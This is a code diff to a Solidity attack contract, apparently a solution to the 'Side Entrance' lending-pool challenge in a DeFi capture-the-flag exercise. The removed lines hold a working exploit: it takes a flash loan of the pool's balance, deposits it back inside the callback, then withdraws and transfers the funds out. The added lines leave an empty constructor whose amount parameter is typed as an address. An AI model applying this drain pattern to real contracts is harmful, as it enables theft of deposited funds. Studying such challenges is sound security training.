@@ -7,23 +7,6 @@
  contract AttackSideEntrance {
     SideEntranceLenderPool pool;
 
-    constructor(address _pool) {
-        pool = SideEntranceLenderPool(_pool);
+    constructor(address _pool, address _recovery, address _amount) {
+        
     }
-
-    receive() external payable {}
-    
-    function attack() external {
-        pool.flashLoan(address(pool).balance);
-        pool.withdraw();
-        payable(msg.sender).transfer(address(this).balance);
-    }
-
-    function execute() external payable{
-        pool.deposit{value: msg.value}();
-    }
-
-    function transfer(address recipient, uint256 amount) external payable {
-        SafeTransferLib.safeTransferETH(recipient, amount);
-    }
- }
